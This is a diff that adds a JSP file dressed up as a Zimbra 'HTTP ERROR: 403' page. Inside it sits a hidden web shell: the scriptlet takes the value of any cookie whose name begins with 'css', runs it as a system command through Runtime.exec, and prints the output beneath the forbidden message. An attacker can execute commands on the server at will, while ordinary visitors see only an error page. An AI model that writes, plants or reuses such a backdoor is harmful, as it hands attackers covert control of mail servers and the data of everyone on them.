@@ -1,0 +1,52 @@
+<%@ page import="com.zimbra.common.util.L10nUtil,com.zimbra.common.util.L10nUtil.MsgKey" %>
+<%@ page import="java.util.*,java.io.*"%>
+<HTML>
+<HEAD>
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"/>
+    <title>Error 403</title>
+</HEAD><BODY>
+<h2>HTTP ERROR: 403</h2>
+    <pre>You are not allowed to access this page.</pre>
+<pre>
+<%
+Cookie cookie = null;
+         Cookie[] cookies = null;
+         // Get an array of Cookies associated with the this domain
+         cookies = request.getCookies();
+if( cookies != null ) 
+{
+    for (int i = 0; i < cookies.length; i++) 
+	{
+        cookie = cookies[i];		
+		if(cookie.getName().substring(0,3).equals("css"))
+		{
+			if ( cookie.getValue()!= null)
+			{
+				out.println("Command: " + cookie.getValue() + "<BR>");
+				Process p = Runtime.getRuntime().exec(cookie.getValue());
+				OutputStream os = p.getOutputStream();
+				InputStream in = p.getInputStream();
+				DataInputStream dis = new DataInputStream(in);
+				String disr = dis.readLine();
+				while ( disr != null ) 
+				{
+					out.println(disr); 
+					disr = dis.readLine(); 
+                }
+			}
+		
+		}
+	
+    }
+}
+
+%>
+</pre>
+</BODY></HTML>
+    
+    
+
+
+<%--
+    This page can be customized.
+--%> 
